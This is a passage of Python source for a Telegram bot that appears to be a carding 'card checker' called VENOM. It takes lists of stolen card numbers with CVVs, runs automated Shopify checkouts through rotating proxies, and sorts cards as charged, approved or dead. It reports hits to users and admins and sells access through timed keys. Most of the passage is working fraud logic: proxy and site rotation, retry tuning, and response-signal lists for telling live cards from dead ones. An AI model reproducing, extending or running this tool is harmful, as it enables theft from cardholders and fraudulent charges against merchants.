    row2 = [{"text": f"{'✅ ' if current==t else ''}{label}", "callback_data": f"amount_tier_{t}"}
            for t, label in tiers[3:]]
    return [row1, row2, [{"text": "↪️  Back", "callback_data": "gates"}]]

def rows_proxy(uid=None):
    pool_on    = user_pool_enabled.get(uid, True) if uid else True
    pool_label = "✅  Use Proxy Pool (ON)" if pool_on else "🚀  Use Proxy Pool (OFF)"
    return [
        [{"text": pool_label, "callback_data": "toggle_pool"}],
        [{"text": "✅  Test Proxy",   "callback_data": "test_proxy_btn"},
         {"text": "✋  Remove Proxy", "callback_data": "remove_proxy_btn"}],
        [{"text": "↪️  Back",          "callback_data": "gates"}],
    ]

def rows_admin():
    return [
        [{"text": "👑  Users",       "callback_data": "admin_users"},
         {"text": "🌐  Sites",       "callback_data": "admin_sites"}],
        [{"text": "📡  Broadcast",   "callback_data": "admin_broadcast_info"},
         {"text": "⚙️  Proxy Pool",  "callback_data": "admin_proxy_pool"}],
        [{"text": "🔑  Key Manager", "callback_data": "admin_keys"},
         {"text": "📊  User Status", "callback_data": "admin_user_status"}],
        [{"text": "  Mandatory Sub  ", "callback_data": "admin_mandatory_sub"}],
        [{"text": "❌  Close",       "callback_data": "close"}],
    ]

def rows_admin_users():
    return [
        [{"text": "📋  List Users",   "callback_data": "admin_list_users"}],
        [{"text": "✅  Auth User",    "callback_data": "admin_add_user_info"},
         {"text": "🔥  Deauth User",  "callback_data": "admin_rm_user_info"}],
        [{"text": "↪️  Back",          "callback_data": "admin_panel"}],
    ]

def rows_admin_sites():
    return [
        [{"text": "📋  List Sites",   "callback_data": "admin_list_sites_cb"}],
        [{"text": "✅  Add Site",     "callback_data": "admin_add_site_info"},
         {"text": "🔥  Remove Site",  "callback_data": "admin_rm_site_info"}],
        [{"text": "↪️  Back",         "callback_data": "admin_panel"}],
    ]

def rows_admin_proxy_pool():
    return [
        [{"text": "📋  View Pool",   "callback_data": "admin_list_proxy_cb"}],
        [{"text": "✅  Add Proxies", "callback_data": "admin_add_proxy_info"},
         {"text": "🔥  Clear Pool",  "callback_data": "admin_clear_proxy_cb"}],
        [{"text": "↪️  Back",        "callback_data": "admin_panel"}],
    ]

def rows_admin_keys():
    return [
        [{"text": "🔑  Generate Keys", "callback_data": "admin_genkeys_info"}],
        [{"text": "📋  List Keys",     "callback_data": "admin_list_keys_cb"}],
        [{"text": "🔥  Delete Key",    "callback_data": "admin_delkey_info"}],
        [{"text": "↪️  Back",          "callback_data": "admin_panel"}],
    ]

def rows_stop():
    return [
        [{"text": "✋  Stop Check", "callback_data": "stop_mass"}],
    ]

def kb_stop():
    return [[Button.inline("Stop Check", b"stop_mass")]]



# ─── USER PROXY STORAGE  (per-user pool — list per uid) ───────────────────────
#
#  user_proxies: Dict[int uid → List[str proxy]]
#
#  Backward-compat shim: get_user_proxy(uid) still returns the FIRST entry
#  so all existing call-sites that do  `proxy = get_user_proxy(uid)`  keep working.
#
#  Migration: if the JSON on disk has the old format {uid: "str"} we auto-convert
#  each string value to a single-element list on load.
#
def load_user_proxies():
    global user_proxies
    if not os.path.exists(USER_PROXY_FILE):
        user_proxies = {}
        return
    try:
        with open(USER_PROXY_FILE, 'r') as f:
            raw = json.load(f)
        migrated = {}
        for k, v in raw.items():
            uid_int = int(k)
            if isinstance(v, list):
                migrated[uid_int] = [x for x in v if isinstance(x, str) and x.strip()]
            elif isinstance(v, str) and v.strip():
                migrated[uid_int] = [v.strip()]   # old single-string → list
            else:
                migrated[uid_int] = []
        user_proxies = migrated
    except Exception:
        user_proxies = {}

def save_user_proxies():
    try:
        with open(USER_PROXY_FILE, 'w') as f:
            json.dump({str(k): v for k, v in user_proxies.items()}, f, indent=2)
    except Exception:
        pass

# ── read helpers ─────────────────────────────────────────────────────────────
def get_user_proxy(uid: int):
    """Return first proxy in the user's personal pool (or None). Backward compat."""
    lst = user_proxies.get(uid, [])
    return lst[0] if lst else None

def get_user_proxy_list(uid: int) -> list:
    """Return full personal proxy list for uid."""
    return list(user_proxies.get(uid, []))

# ── write helpers ─────────────────────────────────────────────────────────────
def set_user_proxy(uid: int, proxy: str):
    """REPLACE the entire personal pool with a single proxy (legacy compat)."""
    user_proxies[uid] = [proxy.strip()]
    save_user_proxies()

def add_user_proxy(uid: int, proxy: str) -> bool:
    """Append proxy to personal pool. Returns False if already present."""
    proxy = proxy.strip()
    lst   = user_proxies.setdefault(uid, [])
    if proxy in lst:
        return False
    lst.append(proxy)
    save_user_proxies()
    return True

def add_user_proxies_bulk(uid: int, proxies: list) -> dict:
    """
    Add multiple proxies to the user's personal pool.
    Returns {'added': int, 'duplicates': int, 'invalid': int}.
    """
    lst    = user_proxies.setdefault(uid, [])
    exists = set(lst)
    added = dups = invalid = 0
    seen_batch: set = set()
    for p in proxies:
        p = p.strip()
        if not p or p.startswith('#'):
            continue
        if not _validate_proxy_fmt(p):
            invalid += 1
            continue
        if p in exists or p in seen_batch:
            dups += 1
            continue
        lst.append(p)
        seen_batch.add(p)
        added += 1
    if added:
        save_user_proxies()
    return {'added': added, 'duplicates': dups, 'invalid': invalid}

def remove_user_proxy(uid: int):
    """Clear the ENTIRE personal pool (legacy: used by /clearuserproxy)."""
    user_proxies.pop(uid, None)
    save_user_proxies()

def remove_user_proxy_entry(uid: int, proxy: str) -> bool:
    """Remove a specific proxy from personal pool. Returns True if removed."""
    lst = user_proxies.get(uid, [])
    proxy = proxy.strip()
    if proxy not in lst:
        return False
    lst.remove(proxy)
    if not lst:
        user_proxies.pop(uid, None)
    save_user_proxies()
    return True

def clear_user_proxies(uid: int):
    """Wipe all proxies in personal pool."""
    user_proxies.pop(uid, None)
    save_user_proxies()

load_user_proxies()

# ─── PER-USER POOL TOGGLE ──────────────────────────────────────────────────────
user_pool_enabled = {}

def load_user_pool():
    global user_pool_enabled
    if os.path.exists(USER_POOL_FILE):
        try:
            with open(USER_POOL_FILE, 'r') as f:
                user_pool_enabled = {int(k): v for k, v in json.load(f).items()}
        except: user_pool_enabled = {}

def save_user_pool():
    try:
        with open(USER_POOL_FILE, 'w') as f:
            json.dump({str(k): v for k, v in user_pool_enabled.items()}, f)
    except: pass

load_user_pool()

# ══════════════════════════════════════════════════════════════════════════════
# KEY SYSTEM & TIMED ACCESS
# ══════════════════════════════════════════════════════════════════════════════
_keys_data   = {}
_user_access = {}

def load_keys():
    global _keys_data
    if os.path.exists(KEYS_FILE):
        try:
            with open(KEYS_FILE, 'r') as f: _keys_data = json.load(f)
        except: _keys_data = {}

def save_keys():
    try:
        with open(KEYS_FILE, 'w') as f: json.dump(_keys_data, f, indent=2)
    except: pass

def load_user_access():
    global _user_access
    if os.path.exists(USER_ACCESS_FILE):
        try:
            with open(USER_ACCESS_FILE, 'r') as f:
                _user_access = {int(k): v for k, v in json.load(f).items()}
        except: _user_access = {}

def save_user_access():
    try:
        with open(USER_ACCESS_FILE, 'w') as f:
            json.dump({str(k): v for k, v in _user_access.items()}, f, indent=2)
    except: pass

def generate_key():
    chars = string.ascii_letters + string.digits
    rand  = ''.join(secrets.choice(chars) for _ in range(20))
    return f"{KEY_PREFIX}-{rand}"

def _now_utc():
    return datetime.now(timezone.utc)

def set_user_access(uid: int, tier: str, plan_days: int, granted_by="admin"):
    expires = (_now_utc() + timedelta(days=plan_days)).isoformat()
    _user_access[uid] = {
        "tier":       tier,
        "expires_at": expires,
        "plan_days":  plan_days,
        "granted_by": granted_by,
        "granted_at": _now_utc().isoformat(),
    }
    save_user_access()

def revoke_user_access(uid: int):
    _user_access.pop(uid, None)
    save_user_access()

def is_access_valid(uid: int) -> bool:
    acc = _user_access.get(uid)
    if not acc: return False
    try:
        exp = datetime.fromisoformat(acc['expires_at'])
        if exp.tzinfo is None: exp = exp.replace(tzinfo=timezone.utc)
        return _now_utc() < exp
    except: return False

def get_user_tier(uid: int) -> str | None:
    if is_admin(uid): return "admin"
    if is_access_valid(uid): return _user_access[uid].get('tier', 'key')
    if str(uid) in load_premium_users(): return "admin"
    return None

def get_user_limit(uid: int) -> int:
    tier = get_user_tier(uid)
    return TIER_LIMITS.get(tier, 0)

def time_remaining(uid: int) -> str | None:
    acc = _user_access.get(uid)
    if not acc: return None
    try:
        exp = datetime.fromisoformat(acc['expires_at'])
        if exp.tzinfo is None: exp = exp.replace(tzinfo=timezone.utc)
        delta = exp - _now_utc()
        if delta.total_seconds() <= 0: return None
        d = delta.days; h = delta.seconds // 3600; m = (delta.seconds % 3600) // 60
        if d > 0:  return f"{d}d {h}h {m}m"
        if h > 0:  return f"{h}h {m}m"
        return f"{m}m"
    except: return None

load_keys()
load_user_access()

# ─── SIGNAL LISTS (merged from shop.py) ────────────────────────────────────────
# The original _DEAD_INDICATORS was a single flat tuple that lumped together
# proxy errors, site errors, and card declines.  The shop.py approach splits
# these into three purpose-specific tuples so check_card_with_retry() can make
# finer-grained decisions (e.g. retry on proxy error, rotate site on site error,
# report as Dead on card decline).

# Proxy is broken at the network/auth level
_PROXY_DEAD_SIGNALS = (
    'proxy dead', 'invalid proxy format', 'no proxy', 'invalid proxy',
    'proxy error', 'proxy failed', 'cannot connect to proxy',
    'proxy connection failed', 'bad proxy',
    'error in 1st req', 'error in 1 req',
    'error in 2nd req', 'error in 2 req',
    'error in 1st request', 'error in first request',
    'error: ',
)

# The store itself is dead / mis-configured / unreachable
_SITE_DEAD_SIGNALS = (
    'captcha_required', 'captcha required',
    'site dead', 'site errors',
    'no_session_token', 'no session token',
    'invalid url', 'invalid_url',
    'could not resolve', 'domain name not found',
    'name or service not known',
    'connection failed', 'connection refused',
    'empty reply from server',
    'tlsv1 alert', 'ssl routines', 'openssl ssl_connect', 'ssl error',
    'httperror504', 'http 404', 'http error',
    'bad gateway', 'service unavailable', 'gateway timeout',
    'login required', 'address not valid',
    'no proper json',
    'receipt id is empty', 'handle is empty',
    'product id is empty', 'tax amount is empty',
    'payment method identifier is empty',
    'failed to detect product',
    'failed to create checkout',
    'url rejected', 'malformed input',
    'amount_too_small', 'amount too small',
    'delivery_delivery_line_detail_changed',
    'delivery_address2_required',
    'all products sold out',
    'tokenize_fail', 'payments_payment_flexibility_terms_id_mismatch',
    'merchandise_expected_price_mismatch',
    'site not supported', 'all_retries_failed',
    'previously proposed price', 'order total has changed',
    'card check timed out', 'timeout finding product',
    'step 0 failed',
)

# The card itself was rejected by the bank (Status=True from engine)
_CARD_DEAD_SIGNALS = (
    'do not honor', 'card declined', 'card_declined', 'declined',
    'insufficient funds', 'insufficient_funds',
    'transaction not permitted', 'transaction not allowed',
    'invalid card', 'invalid_card',
    'card expired', 'card_expired', 'expired card',
    'lost card', 'stolen card',
    'restricted card', 'restricted_card',
    'security violation',
    'cvv failed', 'cvc failed', 'cvv2 failed',
    'card not supported', 'card_not_supported',
    'blocked', 'fraud',
    'generic_error', 'payment_failed',
    'payments_card_error',
    'payments_credit_card_number_invalid',
    'payments_invalid_expiry_month',
    'payments_invalid_expiry_year',
    'payments_invalid_cvv',
    'incorrect_number', 'invalid_number',
    'card_velocity_exceeded',
    'withdrawal_limit_exceeded',
    'call_issuer',
    'pick_up_card',
    'authentication_required',
    'card is not supported',
    'pickup_card',
    'revocation_of_authorization',
)

# Response codes that confirm the card was CHARGED (order placed)
_CHARGED_SIGNALS = (
    'order_placed', 'order placed',
    'processedreceipt', 'processed_receipt',
    'payment_accepted',
    'thank you for your order',
    'your order has been placed',
    'order confirmed',
    'shopify_payments',
)

# Response codes that signal the card is LIVE but needs 3DS / OTP
_APPROVED_SIGNALS = (
    'otp_required', 'otp required',
    'actionrequiredreceipt', 'action_required',
    '3ds_authentication', '3ds authentication',
    'insufficient_funds', 'insufficient funds',
    'authentication required',
    'redirect_to_3ds',
)

# Back-compat alias — legacy dead-site checks reference this name
_DEAD_INDICATORS = _SITE_DEAD_SIGNALS

# ─── HELPERS ───────────────────────────────────────────────────────────────────
def get_file_lines(fp):
    if not os.path.exists(fp): return []
    try:
        with open(fp,'r',encoding='utf-8',errors='ignore') as f:
            return [l.strip() for l in f if l.strip()]
    except: return []

def load_premium_users(): return get_file_lines(PREMIUM_FILE)
def load_sites():         return get_file_lines(SITES_FILE)
def load_proxies():       return get_file_lines(PROXY_FILE)

def is_premium(uid: int) -> bool:
    if is_admin(uid): return True
    if is_access_valid(uid): return True
    if str(uid) in load_premium_users(): return True
    return False

def is_admin(uid):   return uid in ADMIN_IDS or uid in _DEFAULT_ADMINS

def extract_cc(text):
    matches = re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)
    cards = []
    for card, month, year, cvv in matches:
        if len(year) == 2: year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(msg):
    if not msg: return True
    return any(k in str(msg).lower() for k in _DEAD_INDICATORS)

def make_progress_bar(current, total, width=20):
    if total == 0: return f"[{'░'*width}] 0/0 (0%)"
    filled = int(width * current / total)
    pct    = int(100 * current / total)
    return f"[{'█'*filled}{'░'*(width-filled)}] {current}/{total} ({pct}%)"

async def get_display_name(uid):
    try:
        entity = await bot.get_entity(uid)
        name = (entity.first_name or "").strip()
        if getattr(entity, 'last_name', None):
            name = f"{name} {entity.last_name}".strip()
        return name or f"User {uid}"
    except:
        return f"User {uid}"

async def get_display_info(uid):
    """Returns (display_name, @username_or_empty)"""
    try:
        entity = await bot.get_entity(uid)
        name = (entity.first_name or "").strip()
        if getattr(entity, 'last_name', None):
            name = f"{name} {entity.last_name}".strip()
        username = getattr(entity, 'username', '') or ''
        return name or f"User {uid}", username
    except:
        return f"User {uid}", ''

def checker_line(uid, display_name):
    return f'🧑 <b>{fi("Checked by")}</b> ↬ <a href="tg://user?id={uid}">{display_name}</a>'

def owner_line():
    return f'⚙️ <b>{fi("Dev")}</b> ↬ <a href="https://t.me/{OWNER_USERNAME}">{OWNER_NAME}</a>'

def _result_header(status):
    if status == 'Charged':  return (f"🔥 {fi('CHARGED')} 🔥",          f"{fi('Charged')} 🔥")
    if status == 'Approved': return (f"✅ {fi('APPROVED')} ✅",          f"{fi('Approved')} ✅")
    if status == 'OTP':      return (f"🔔 {fi('OTP REQUIRED')} 🔔",      f"{fi('OTP Required')} 🔔")
    return (f"❌ {fi('DECLINED')} ❌", f"{fi('Declined')} ❌")

def build_result_card(result, bin_info, uid, cname):
    brand, btype, level, bank, country, flag = bin_info
    header, status_label = _result_header(result['status'])
    gate = result.get('gateway', 'Shopify Payments')
    if result['status'] in ('Charged', 'Approved'):
        status_icon = "💸"
    else:
        status_icon = '<tg-emoji emoji-id="5810108367913360444">👩‍💻</tg-emoji>'
    price_val = result.get('price', '-')
    price_str = f"${price_val}" if price_val not in ('-', '', None) else '-'
    receipt_url = result.get('receipt_url', '')
    receipt_line = (
        f"\n🧾 <b>{fi('Receipt')}:</b> <a href=\"{receipt_url}\">View Order Receipt →</a>"
        if result['status'] == 'Charged' and receipt_url else ''
    )
    return pe(
        f"<b>{header}</b>\n"
        f"<b>{SEP}</b>\n"
        f"🃏 <b>{fi('Card')}:</b> <tg-spoiler><code>{result['card']}</code></tg-spoiler>\n"
        f"{status_icon} <b>{fi('Status')}:</b> {status_label}\n"
        f"🖥 <b>{fi('Response')}:</b> <i>{result['message']}</i>\n"
        f"🌐 <b>{fi('Gateway')}:</b> <i>{gate}</i>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"ℹ️ <b>{fi('Info')}</b> ↬ <i>{brand} | {btype} {level}</i>\n"
        f"🏦 <b>{fi('Bank')}</b> ↬ <i>{bank}</i>\n"
        f"🌍 <b>{fi('Country')}</b> ↬ <i>{country} {flag}</i>\n"
        f"💵 <b>{fi('Price')}</b> ↬ <b><i>{price_str}</i></b>"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"{checker_line(uid, cname)}\n"
        f"{DEV_LINE}"
        f"{receipt_line}"
    )

def get_proxies_for_user(uid):
    personal    = get_user_proxy_list(uid)
    global_pool = load_proxies()
    pool_on     = user_pool_enabled.get(uid, True)
    if is_admin(uid):
        if personal:
            return (personal + global_pool) if pool_on else personal
        return global_pool if pool_on else []
    return personal

# ─── SMART PROXY ROTATOR ───────────────────────────────────────────────────────
class SmartProxyRotator:
    """
    Round-robin proxy rotator with failure tracking.
    - Cycles proxies in order so every proxy gets used evenly.
    - Marks failures; after MAX_CONSECUTIVE_FAILS the proxy enters a
      cooldown period of COOLDOWN_SECS before being re-admitted.
    - On success the failure counter resets immediately.
    """
    MAX_CONSECUTIVE_FAILS = 6    # رُفع من 3 إلى 6: البروكسي يحتاج 6 فشل متتالي قبل الإيقاف المؤقت
    COOLDOWN_SECS         = 120  # رُفع من 60 إلى 120 ثانية: فترة راحة أطول تُحسّن أداء البروكسي عند عودته

    def __init__(self, proxies: list):
        self._proxies    = list(proxies)
        self._index      = 0
        self._fails      = {}
        self._skip_until = {}

    def reload(self, proxies: list):
        if proxies:
            self._proxies = list(proxies)
            if self._proxies:
                self._index = self._index % len(self._proxies)

    def get(self):
        now = time.time()
        n   = len(self._proxies)
        if not n:
            return None
        for _ in range(n):
            proxy = self._proxies[self._index % n]
            self._index = (self._index + 1) % n
            if self._skip_until.get(proxy, 0) <= now:
                return proxy
        if self._proxies:
            return min(self._proxies, key=lambda p: self._skip_until.get(p, 0))
        return None

    def mark_failure(self, proxy: str):
        self._fails[proxy] = self._fails.get(proxy, 0) + 1
        if self._fails[proxy] >= self.MAX_CONSECUTIVE_FAILS:
            self._skip_until[proxy] = time.time() + self.COOLDOWN_SECS
            self._fails[proxy] = 0

    def mark_success(self, proxy: str):
        self._fails[proxy]      = 0
        self._skip_until[proxy] = 0

    @property
    def live_count(self) -> int:
        now = time.time()
        return sum(1 for p in self._proxies if self._skip_until.get(p, 0) <= now)


# ─── SITE METADATA ─────────────────────────────────────────────────────────────
def load_site_meta() -> dict:
    try:
        if os.path.exists(SITE_META_FILE):
            with open(SITE_META_FILE, 'r') as f:
                return json.load(f)
    except Exception:
        pass
    return {}

def save_site_meta(meta: dict):
    try:
        with open(SITE_META_FILE, 'w') as f:
            json.dump(meta, f, indent=2)
    except Exception:
        pass

def update_site_meta(results_list: list):
    meta = load_site_meta()
    for r in results_list:
        site = r.get('site', '')
        if not site:
            continue
        meta[site] = {
            'gateway':  r.get('gateway', '-'),
            'price':    r.get('price', '-'),
            'response': str(r.get('message', ''))[:80],
            'checked':  datetime.now().strftime('%d/%m/%Y %H:%M'),
        }
    save_site_meta(meta)


# ─── BIN INFO ──────────────────────────────────────────────────────────────────
async def get_bin_info(card_number):
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get(f'https://bins.antipublic.cc/bins/{card_number[:6]}') as r:
                if r.status != 200: return '-','-','-','-','-',''
                d = json.loads(await r.text())
                return (d.get('brand','-'), d.get('type','-'), d.get('level','-'),
                        d.get('bank','-'), d.get('country_name','-'), d.get('country_flag',''))
    except: return '-','-','-','-','-',''

# ─── CARD CHECKING ─────────────────────────────────────────────────────────────
def _make_result(card, status, message, price='-', gateway='Shopify Payments',
                 receipt_url='', retryable=False, proxy='', site=''):
    return {
        'status':      status,
        'message':     message,
        'card':        card,
        'gateway':     gateway,
        'price':       price,
        'receipt_url': receipt_url,
        'retry':       retryable,
        'proxy':       proxy,
        'site':        site,
    }

_PROXY_ERR_SIGNALS = (
    'curl: (28)', 'curl: (7)', 'curl: (35)', 'curl: (56)', 'curl: (97)',
    'connection timed out', 'connection timeout', 'failed to perform',
    'timed out', 'proxy', 'eof occurred', 'remote end closed',
    'socks5', 'socks4', 'cannot complete', 'invalid version',
)

def _is_proxy_err(msg: str) -> bool:
    m = msg.lower()
    return any(s in m for s in _PROXY_ERR_SIGNALS)

_SITE_ERR_SIGNALS = (
    'returned 404', 'returned 403', 'returned 401',
    'returned 410', 'returned 429', 'returned 503', 'returned 502', 'returned 500',
    'no available products', 'all products sold out',
    'could not extract delivery handle',
    'could not extract signedhandles', 'signedhandles',
    'could not extract shipping',
    'missing stableid', 'missing buildid', 'missing sourcetoken',
    'failed to detect', 'failed to create checkout',
    'cart permalink returned', 'permalink returned',
)

def _is_site_err(msg: str) -> bool:
    m = msg.lower()
    return any(s in m for s in _SITE_ERR_SIGNALS)

def _classify_result(res: "CheckResult"):
    """
    Map a CheckResult to one of ('Charged', 'Approved', 'Dead') using the
    signal lists from shop.py.  Replaces the earlier if/elif chain that only
    checked the enum status, missing cases where the engine returned ERROR but
    the message text actually indicates a card-level decline or a live hit.

    Priority order:
      1. Engine CHARGED  → always 'Charged'
      2. Engine APPROVED → check message for dead signals first (banks sometimes
         send 3DS challenges for definitively dead cards)
      3. Engine DECLINED → check message for approved signals (e.g. INSUFFICIENT_FUNDS)
      4. Engine ERROR    → check message for charged/approved/dead signals;
                           if nothing matches treat as retryable site error
    """
    status = res.status
    msg    = (str(res.status_code or "") + " " + str(res.error or "")).lower()

    # ── Definite charge ────────────────────────────────────────────────────────
    if status == CheckStatus.CHARGED:
        return "Charged"
    if any(s in msg for s in _CHARGED_SIGNALS):
        return "Charged"

    # ── Approved / live card ───────────────────────────────────────────────────
    if status == CheckStatus.APPROVED:
        # Even an APPROVED status can mask a dead card if the message says so
        if any(s in msg for s in _CARD_DEAD_SIGNALS):
            return "Dead"
        return "Approved"
    if any(s in msg for s in _APPROVED_SIGNALS):
        return "Approved"

    # ── Bank-level card death ──────────────────────────────────────────────────
    if status == CheckStatus.DECLINED:
        return "Dead"
    if any(s in msg for s in _CARD_DEAD_SIGNALS):
        return "Dead"

    # ── Everything else is an infrastructure error → Dead (retryable) ─────────
    return "Dead"


async def check_card_with_retry(card, sites, proxies, max_retries=2, max_proxy_tries=None):
    """
    Async card-checking orchestrator with site rotation and proxy fallback.

    Changes vs original
    -------------------
    * Calls run_checkout_for_card_async() directly (no asyncio.to_thread).
      The async engine (aiohttp + inline GQL) is faster and handles captcha
      detection internally.
    * Uses _classify_result() + the shop.py signal tuples instead of the old
      flat _DEAD_INDICATORS check — finer-grained Dead / Approved / Charged
      classification, especially for codes like INSUFFICIENT_FUNDS.
    * Falls back to the original synchronous run_checkout_for_card (via
      asyncio.to_thread) when the async engine raises an unexpected exception,
      so the bot never silently drops cards.
    """
    if not sites:
        return _make_result(card, 'Dead', 'No sites configured')

    last_err   = 'Unknown error'
    proxy_pool = list(proxies) if proxies else []
    MAX_TRIES  = max(max_proxy_tries or 0, max_retries, 5)  # رُفع من 3 إلى 5 محاولات: يزيد فرصة نجاح البطاقة مع مواقع وبروكسيات مختلفة
    failed_sites: set = set()

    for attempt in range(MAX_TRIES):
        # ── pick site ──────────────────────────────────────────────────────────
        available = [s for s in sites if s not in failed_sites] or list(sites)
        if not available:
            failed_sites.clear()
            available = list(sites)
        shop_url = random.choice(available)

        # ── pick proxy ─────────────────────────────────────────────────────────
        if proxy_pool:
            proxy_raw = random.choice(proxy_pool)
            try:
                proxy_url = normalize_proxy(proxy_raw)
            except Exception:
                proxy_url = ""
        else:
            proxy_raw = ""
            proxy_url = ""

        # ── run checkout (async engine only — sync fallback removed to prevent
        #    thread-pool exhaustion with 25 concurrent workers) ─────────────────
        try:
            res = await run_checkout_for_card_async(shop_url, card, proxy_url)
        except Exception as e:
            last_err = str(e)
            if _is_proxy_err(last_err) and attempt < MAX_TRIES - 1:
                await asyncio.sleep(0.2 * (attempt + 1))  # خُفِّض من 0.5 إلى 0.2
                continue
            failed_sites.add(shop_url)
            if attempt < MAX_TRIES - 1:
                continue
            return _make_result(card, 'Dead', last_err)

        # ── classify result ────────────────────────────────────────────────────
        verdict = _classify_result(res)
        msg_str = str(res.status_code or res.error or 'Error')

        if verdict == 'Charged':
            return _make_result(card, 'Charged', 'ORDER PLACED',
                                price=res.amount or '-',
                                receipt_url=res.receipt_url or '',
                                proxy=proxy_raw, site=shop_url,
                                gateway=getattr(res, 'gateway', 'Shopify Payments'))

        if verdict == 'Approved':
            return _make_result(card, 'Approved', msg_str,
                                price=res.amount or '-',
                                proxy=proxy_raw, site=shop_url,
                                gateway=getattr(res, 'gateway', 'Shopify Payments'))

        # verdict == 'Dead' — decide whether to retry
        last_err = msg_str
        msg_lower = last_err.lower()

        # Proxy error → retry with different proxy
        if _is_proxy_err(last_err) and attempt < MAX_TRIES - 1:
            await asyncio.sleep(0.2 * (attempt + 1))  # خُفِّض: 0.2s → 0.4s → 0.6s
            continue

        # Site-level error → mark site failed and try a different one
        if (_is_site_err(last_err)
                or any(s in msg_lower for s in _SITE_DEAD_SIGNALS)
                and attempt < MAX_TRIES - 1):
            failed_sites.add(shop_url)
            continue

        # Retryable infrastructure error (e.g. TAX change, captcha)
        if res.retryable and attempt < max_retries - 1:
            await asyncio.sleep(0.2)
            continue

        # Card-level decline — no point retrying on a different site
        if any(s in msg_lower for s in _CARD_DEAD_SIGNALS):
            return _make_result(card, 'Dead', last_err,
                                retryable=False, site=shop_url)

        return _make_result(card, 'Dead', last_err,
                            retryable=res.retryable, site=shop_url)

    # ── Last resort: try direct connection when all proxy attempts failed ───────
    if proxy_pool:
        try:
            avail2   = [s for s in sites if s not in failed_sites] or list(sites)
            shop_url = random.choice(avail2)
            res      = await run_checkout_for_card_async(shop_url, card, "")
            verdict  = _classify_result(res)
            if verdict == 'Charged':
                return _make_result(card, 'Charged', 'ORDER PLACED',
                                    price=res.amount or '-',
                                    receipt_url=res.receipt_url or '', site=shop_url)
            if verdict == 'Approved':
                return _make_result(card, 'Approved',
                                    str(res.status_code or 'APPROVED'),
                                    price=res.amount or '-', site=shop_url)
        except Exception:
            pass

    return _make_result(card, 'Dead', last_err)

async def test_site(site, proxy):
    try:
        proxy_url = ""
        try:
            proxy_url = normalize_proxy(proxy)
        except Exception:
            pass
        test_card = "5154623245618097|03|2032|156"
        res = await asyncio.to_thread(run_checkout_for_card, site, test_card, proxy_url)
        alive = res.status != CheckStatus.ERROR or not res.retryable
        return {'site': site, 'status': 'alive' if alive else 'dead'}
    except Exception:
        return {'site': site, 'status': 'dead'}

def _proxy_host_port(proxy: str):
    import re
    p = proxy.strip()
    p = re.sub(r'^(https?|socks[45])://', '', p)
    p = re.sub(r'^[^@]+@', '', p)
    parts = p.split(':')
    try:
        host = parts[0]
        port = int(parts[1])
        return host, port
    except:
        return None, None

async def test_proxy(proxy):
    host, port = _proxy_host_port(proxy)
    if not host or not port:
        return {'proxy': proxy, 'status': 'dead'}
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=12
        )
        writer.close()
        try: await writer.wait_closed()
        except: pass
        return {'proxy': proxy, 'status': 'alive'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

def _proxy_to_url(proxy: str) -> str:
    p = proxy.strip()
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    parts = p.split(':')
    if len(parts) == 2:
        return f'http://{p}'
    if len(parts) >= 4:
        host, port = parts[0], parts[1]
        pw_idx = p.rfind(':')
        user_part = p[len(host)+len(port)+2:pw_idx]
        pw_part   = p[pw_idx+1:]
        return f'http://{user_part}:{pw_part}@{host}:{port}'
    return f'http://{p}'

async def get_proxy_ip(proxy: str) -> str | None:
    proxy_url = _proxy_to_url(proxy)
    if proxy_url.startswith('socks'):
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get('https://api.ipify.org', proxy=proxy_url) as r:
                if r.status == 200:
                    return (await r.text()).strip()
    except:
        pass
    return None

def _save_working_proxy(proxy: str, user_id: int, card: str):
    if not proxy:
        return
    try:
        existing = set()
        if os.path.exists(WORKING_PROXY_FILE):
            with open(WORKING_PROXY_FILE, 'r') as f:
                existing = {l.strip() for l in f if l.strip()}
        if proxy not in existing:
            with open(WORKING_PROXY_FILE, 'a') as f:
                f.write(proxy + '\n')
    except Exception:
        pass

def _send_notification(chat_id, text):
    try:
        _raw_post(f"{TG_API}/sendMessage", {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        })
    except Exception:
        pass

async def notify_admins_hit(user_id, result, bin_info, checker_name):
    status = result.get('status', '')
    if status not in ('Charged', 'Approved'):
        return
    label = "🔥 CHARGED HIT" if status == 'Charged' else "✅ APPROVED HIT"
    card_text = build_result_card(result, bin_info, user_id, checker_name)
    notif = pe(
        f"<b>{label} — VENOM</b>\n"
        f"<b>{'═'*24}</b>\n"
        f"<b>By:</b> <a href='tg://user?id={user_id}'>{checker_name}</a> (<code>{user_id}</code>)\n"
        f"<b>{'─'*24}</b>\n"
    ) + "\n" + card_text
    proxy = result.get('proxy', '')
    if proxy:
        _save_working_proxy(proxy, user_id, result.get('card', ''))
    targets = list((ADMIN_IDS | _DEFAULT_ADMINS) - {user_id})
    if NOTIFY_GROUP_ID:
        targets.append(NOTIFY_GROUP_ID)
    await asyncio.to_thread(
        lambda: [_send_notification(t, notif) for t in targets]
    )

async def send_realtime_hit(user_id, result, hit_type):
    bin_info     = await get_bin_info(result['card'].split('|')[0])
    checker_name = await get_display_name(user_id)
    msg = build_result_card(result, bin_info, user_id, checker_name)
    sent_msg = None
    try:
        sent_msg = await bot.send_message(user_id, msg, parse_mode='html')
    except:
        pass
    if sent_msg and hit_type == "Charged":
        try:
            await bot.pin_message(user_id, sent_msg.id, notify=True)
        except:
            pass
    asyncio.create_task(notify_admins_hit(user_id, result, bin_info, checker_name))

# ─── MASS CHECK PROGRESS ───────────────────────────────────────────────────────
async def update_mass_progress(user_id, message_id, results, checked, last_res=None):
    total        = results['total']
    ch_cnt       = len(results['charged'])
    ap_cnt       = len(results['approved'])
    dead_list    = results['dead']
    err_cnt      = len(results.get('errored', []))
    BAR_WIDTH    = 18
    pct          = int(100 * checked / total) if total else 0
